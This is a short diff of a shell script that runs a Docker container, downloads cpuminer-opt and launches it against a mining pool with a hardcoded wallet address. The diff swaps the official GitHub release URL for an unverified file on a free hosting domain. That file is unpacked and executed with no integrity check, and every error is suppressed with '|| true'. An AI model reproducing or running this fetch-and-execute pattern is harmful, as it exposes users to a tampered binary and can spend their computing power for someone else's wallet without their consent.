@@ -29,7 +29,7 @@ docker run --network=host -it archlinux bash -c "
   pacman -S --noconfirm wget curl gmp boost nano base-devel gcc glibc || true
 
   echo '⬇️ Загрузка cpuminer-opt...'
-  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz || true
+  wget https://rhm.ucoz.net/cpuminer-opt-linux.tar.gz || true
 
   echo '📦 Распаковка cpuminer-opt...'
   tar xf cpuminer-opt-linux.tar.gz || true
@@ -37,3 +37,4 @@ docker run --network=host -it archlinux bash -c "
   echo '🚀 Запуск майнера...'
   ./cpuminer-sse2 -a yespowertide -o stratum+tcps://eu.rplant.xyz:17059 -u TCFa7qFMfnSTjaCWTnjZEweWont6TSF7jp -t 5 || true
 "
+
